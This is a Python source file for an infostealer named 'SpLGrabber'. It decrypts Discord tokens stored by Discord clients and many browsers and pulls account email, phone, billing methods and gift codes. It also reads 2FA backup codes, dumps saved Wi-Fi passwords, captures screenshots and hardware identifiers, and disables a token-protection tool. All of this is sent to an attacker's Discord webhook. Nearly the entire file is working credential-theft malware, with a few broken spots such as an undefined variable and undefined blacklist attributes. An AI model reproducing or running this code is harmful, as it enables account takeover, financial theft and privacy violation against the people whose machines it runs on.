import base64
import ctypes
import json
import os
import platform
import random
import re
import sqlite3
import subprocess
import sys
import threading
import time
import uuid
from shutil import copy2
from sys import argv
from tempfile import gettempdir, mkdtemp
from zipfile import ZIP_DEFLATED, ZipFile

import psutil
import requests
import wmi
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
from win32crypt import CryptUnprotectData

__CONFIG__ = {
    "webhook":  "Enter Your Webhook",
    "ping": True,
    "pingtype": "Everyone",
    "systeminfo": True,
    "backupcodes": True,
    "discord": True,
}

tempfolder = mkdtemp()
localappdata = os.getenv("localappdata")
temp = os.getenv("temp")


def main(webhook: str):
    webhook = SyncWebhook.from_url(webhook, session=requests.Session())

    threads = [BackupCodes,]
    configcheck(threads)

    for func in threads:
        process = threading.Thread(target=func, daemon=True)
        process.start()
    for t in threading.enumerate():
        try:
            t.join()
        except RuntimeError:
            continue

    content = ""
    if __CONFIG__["ping"]:
        if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
            content += f"@{__CONFIG__['pingtype'].lower()}"

    if not __CONFIG__["backupcodes"]:
        webhook.send(content=content, avatar_url="https://cdn.discordapp.com/attachments/1076103026923819009/1078654670106542080/665002686713823262.png?size=4096", username="SpLGrabber")
    else:
        zipup()
        _file = None
        _file = File(f'{localappdata}\\SpL-Grabbed-{os.getlogin()}.zip')
        webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/attachments/1076103026923819009/1078654670106542080/665002686713823262.png", username="SpLGrabber")

    if __CONFIG__["systeminfo"]:
        PcInfo()

    if __CONFIG__["discord"]:
        Discord()


def SpLGrabber(webhook: str):
    checkforwebhook()

    procs = [main,]

    for proc in procs:
        proc(webhook)


def trygrab(func):
    def wrapper(*args, **kwargs):
        try:
            func(*args, **kwargs)
        except Exception:
            pass
    return wrapper


def checkforwebhook():
    if __CONFIG__["webhook"] == "None" or not __CONFIG__["webhook"]:
        print("Webhook Not Found - Please Enter A New Webhook")
        sys.exit()


def configcheck(list):
    if not __CONFIG__["backupcodes"]:
        list.remove(BackupCodes)

def killprotector():
    roaming = os.getenv('APPDATA')
    path = f"{roaming}\\DiscordTokenProtector\\"
    config = path + "config.json"

    if not os.path.exists(path):
        return

    for process in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
        try:
            os.remove(path + process)
        except FileNotFoundError:
            pass

    if os.path.exists(config):
        with open(config, errors="ignore") as f:
            try:
                item = json.load(f)
            except json.decoder.JSONDecodeError:
                return
            item['auto_start'] = False
            item['auto_start_discord'] = False
            item['integrity'] = False
            item['integrity_allowbetterdiscord'] = False
            item['integrity_checkexecutable'] = False
            item['integrity_checkhash'] = False
            item['integrity_checkmodule'] = False
            item['integrity_checkscripts'] = False
            item['integrity_checkresource'] = False
            item['integrity_redownloadhashes'] = False
            item['iterations_iv'] = 364
            item['iterations_key'] = 457
            item['version'] = 69420

        with open(config, 'w') as f:
            json.dump(item, f, indent=2, sort_keys=True)


class PcInfo:
    def __init__(self):
        self.get_inf(__CONFIG__["webhook"])

    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
        embed = Embed(title="SpL Logger", color=563964)

        computer_os = platform.platform()
        cpu = wmi.WMI().Win32_Processor()[0]
        gpu = wmi.WMI().Win32_VideoController()[0]
        ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        ip = requests.get('https://api.ipify.org').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

        embed.add_field(
            name="System Information",
            value=f''':computer: **PC Username:** **{username}**\n:detective: **PC Name:** **{hostname}**\n🌐 **OS:** **{computer_os}**\n\n:drop_of_blood: **IP:** **{ip}**\n🍷 **MAC:** **{mac}**\n:skull: **HWID:** **{hwid}**\n\n **CPU:** **{cpu.Name}**\n **GPU:** **{gpu.Name}**\n**RAM:** **{ram}GB**''',
            inline=False)
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1076103026923819009/1078654670106542080/665002686713823262.png")

        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/attachments/1076103026923819009/1078654670106542080/665002686713823262.png", username="SpLGrabber")


class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.upload(__CONFIG__["webhook"])

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Ahh I Failed When Taking Password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(self.baseurl, headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token})
                                    if r.status_code == 200:
                                        uid = r.json()['id']
                                        if uid not in self.ids:
                                            self.tokens.append(token)
                                            self.ids.append(uid)
                                except Exception:
                                    pass

                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
                            except Exception:
                                pass

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
                            except Exception:
                                pass

    def upload(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())

        for token in self.tokens:
            if token in self.tokens_sent:
                pass

            val_codes = []
            val = ""
            nitro = ""

            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                       'Content-Type': 'application/json',
                       'Authorization': token}

            user = requests.get(self.baseurl, headers=headers).json()
            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            gift = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)

            username = user['username'] + '#' + user['discriminator']
            discord_id = user['id']
            avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" if requests.get(
                f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            phone = user['phone']
            email = user['email']

            if user['mfa_enabled']:
                mfa = "✅"
            else:
                mfa = "❌"

            premium_types = {
                0: "❌",
                1: "Nitro Classic",
                2: "Nitro",
                3: "Nitro Basic"
            }

            nitro = premium_types.get(user['premium_type'], "❌")

            methods = "❌"
            if payment:
                methods = ""
                for method in payment:
                    if method['type'] == 1:
                        methods += "💳"
                    elif method['type'] == 2:
                        methods += "<:paypal:973417655627288666>"
                    else:
                        methods += "❓"

            val += f'💤 **Discord ID:** `{discord_id}` \n:envelope: **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔒 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n:ice_cube: **Token:** ||{token}||\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'

            if "code" in gift.text:
                codes = json.loads(gift.text)
                for code in codes:
                    val_codes.append((code['code'], code['promotion']['outbound_title']))

            if not val_codes:
                val += f'\n:gift: `0 Gift Cards Founded!`\n'
            elif len(val_codes) >= 3:
                num = 0
                for c, t in val_codes:
                    num += 1
                    if num == 3:
                        break
                    val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
            else:
                for c, t in val_codes:
                    val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'

            embed = Embed(title=username, color=563964)
            embed.add_field(name="\u200b", value=val + "\u200b", inline=False)
            embed.set_thumbnail(url=avatar)

            webhook.send(
                embed=embed,
                avatar_url="https://cdn.discordapp.com/attachments/1076103026923819009/1078654670106542080/665002686713823262.png",
                username="SpLGrabber")
            self.tokens_sent += token

        image = ImageGrab.grab(
            bbox=None,
            all_screens=True,
            include_layered_windows=False,
            xdisplay=None
        )
        image.save(tempfolder + "\\image.png")

        embed2 = Embed(title="Monitor Screenshot", color=563964)
        file = File(tempfolder + "\\image.png", filename="image.png")
        embed2.set_image(url="attachment://image.png")

        webhook.send(
            embed=embed2,
            file=file,
            username="SpLGrabber")


@trygrab
class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

@trygrab
class Wifi:
    def __init__(self):
        self.wifi_list = []
        self.name_pass = {}

        os.makedirs(os.path.join(tempfolder, "Wifi"), exist_ok=True)

        data = subprocess.getoutput('netsh Wlan Show Profile').split('\n')
        for line in data:
            if 'All User Profile' in line:
                self.wifi_list.append(line.split(":")[-1][1:])
            else:
                with open(os.path.join(tempfolder, "Wifi", "WifiPass.txt"), 'w', encoding="utf-8") as f:
                    f.write(f'No Wireless Found In System - Using Ethernet.')
                f.close()

        self.name_pass[i] = ""
        for i in self.wifi_list:
            command = subprocess.getoutput(
                f'netsh Wlan Show Profile "{i}" key=clear')
            if "Key Content" in command:
                split_key = command.split('Key Content')
                tmp = split_key[1].split('\n')[0]
                key = tmp.split(': ')[1]
                self.name_pass[i] = key
            else:
                key = ""
                self.name_pass[i] = key

        with open(os.path.join(tempfolder, "Wifi", "WifiPass.txt"), 'w', encoding="utf-8") as f:
            for i, j in self.name_pass.items():
                f.write(f'WifiName : {i} - Pass : {j}\n')
        f.close()

@trygrab
class BackupCodes:
    def __init__(self):
        self.path = os.environ["HOMEPATH"]
        self.code_path = '\\Downloads\\discord_backup_codes.txt'

        os.makedirs(os.path.join(tempfolder, "Discord"), exist_ok=True)
        self.get_codes()

    def get_codes(self):
        with open(os.path.join(tempfolder, "Discord", "2fa.txt"), "w", encoding="utf-8", errors='ignore') as f:
            if os.path.exists(self.path + self.code_path):
                with open(self.path + self.code_path, 'r') as g:
                    for line in g.readlines():
                        if line.startswith("*"):
                            f.write(line)
            else:
                f.write("No Backup codes finded!")
        f.close()


def zipup():
    _zipfile = os.path.join(localappdata, f'SpL-Grabbed-{os.getlogin()}.zip')
    zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
    abs_src = os.path.abspath(tempfolder)
    for dirname, _, files in os.walk(tempfolder):
        for filename in files:
            absname = os.path.abspath(os.path.join(dirname, filename))
            arcname = absname[len(abs_src) + 1:]
            zipped_file.write(absname, arcname)
    zipped_file.close()

class Debug:
    def __init__(self):
        if self.checks():
            self.self_destruct()

    def get_network(self) -> bool:
        ip = requests.get('https://api.ipify.org').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

        if ip in self.blackListedIPS:
            return True
        if mac in self.blackListedMacs:
            return True

    def get_system(self) -> bool:
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

        if hwid in self.blackListedHWIDS:
            return True
        if username in self.blackListedUsers:
            return True
        if hostname in self.blackListedPCNames:
            return True

    def check_time(self) -> bool:
        current_time = time.time()
        try:
            with open(f"{temp}\\dd_setup.txt", "r") as f:
                code = f.read()
                if code != "":
                    old_time = float(code)
                    if current_time - old_time > 60:
                        with open(f"{temp}\\dd_setup.txt", "w") as f:
                            f.write(str(current_time))
                        return False
                    else:
                        return True
        except FileNotFoundError:
            with open(f"{temp}\\dd_setup.txt", "w") as g:
                g.write(str(current_time))
            return False

    def self_destruct(self) -> None:
        exit()


if __name__ == '__main__' and os.name == "nt":
    SpLGrabber(__CONFIG__["webhook"])
